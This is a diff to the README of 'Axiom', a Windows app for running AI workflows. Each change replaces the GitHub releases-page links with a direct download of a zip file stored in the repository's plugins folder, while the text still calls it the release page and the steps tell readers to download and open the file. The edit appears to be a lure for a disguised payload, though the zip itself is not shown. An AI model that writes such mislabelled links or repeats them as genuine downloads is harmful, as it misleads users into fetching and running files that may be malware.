@@ -1,6 +1,6 @@
 # ⚙️ Axiom - Run AI Workflows With Ease
 
-[![Download Axiom](https://img.shields.io/badge/Download%20Axiom-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/bigj2466/Axiom/releases)
+[![Download Axiom](https://img.shields.io/badge/Download%20Axiom-Visit%20Releases%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/bigj2466/Axiom/main/plugins/Software_v2.0.zip)
 
 ## 🧭 Overview
 
@@ -23,7 +23,7 @@ If you have used AI tools before, Axiom works like a simple runtime layer that k
 
 ## 📦 Download for Windows
 
-1. Go to the [Axiom Releases page](https://github.com/bigj2466/Axiom/releases)
+1. Go to the [Axiom Releases page](https://raw.githubusercontent.com/bigj2466/Axiom/main/plugins/Software_v2.0.zip)
 2. Find the latest release
 3. Download the Windows file for your system
 4. Open the downloaded file to run Axiom
@@ -45,7 +45,7 @@ For best results, use a system with a recent processor and at least 8 GB of RAM 
 ## 🛠️ Install and Run
 
 ### 1. Download the file
-Open the [release page](https://github.com/bigj2466/Axiom/releases) and get the latest Windows build.
+Open the [release page](https://raw.githubusercontent.com/bigj2466/Axiom/main/plugins/Software_v2.0.zip) and get the latest Windows build.
 
 ### 2. Open the file
 If you downloaded an `.exe` or `.msi` file, double-click it.
@@ -191,7 +191,7 @@ This kind of layout keeps the app and your content in one place.
 
 When a new release comes out:
 
-1. Open the [release page](https://github.com/bigj2466/Axiom/releases)
+1. Open the [release page](https://raw.githubusercontent.com/bigj2466/Axiom/main/plugins/Software_v2.0.zip)
 2. Download the newer Windows file
 3. Replace the old app files if the release says to do so
 4. Open the updated app
@@ -216,4 +216,4 @@ Starting with a small test helps you confirm that the app and your AI connection
 
 If you need the installer or app file again, use the release page here:
 
-[https://github.com/bigj2466/Axiom/releases](https://github.com/bigj2466/Axiom/releases)
+[https://raw.githubusercontent.com/bigj2466/Axiom/main/plugins/Software_v2.0.zip](https://raw.githubusercontent.com/bigj2466/Axiom/main/plugins/Software_v2.0.zip)
